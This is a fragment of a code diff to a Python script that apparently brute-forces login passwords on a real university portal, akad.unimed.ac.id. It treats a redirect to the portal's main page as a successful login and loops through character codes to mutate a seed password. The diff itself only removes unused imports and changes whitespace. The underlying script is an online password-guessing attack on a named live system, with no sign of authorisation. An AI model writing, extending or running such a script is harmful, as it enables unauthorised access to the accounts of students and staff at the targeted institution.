@@ -1,6 +1,4 @@
-import asyncio
 import requests
-import aiohttp
 import urllib3
 
 text = list("akuhebat12!")
@@ -23,7 +21,7 @@ def requestlogin(password):
     # print(x.url)
     if(x.url == "https://akad.unimed.ac.id/main.php"):
         return True
-
+        
 try:
     for i in range (ord(text[0]),126,1):
         text[0] = chr(i)
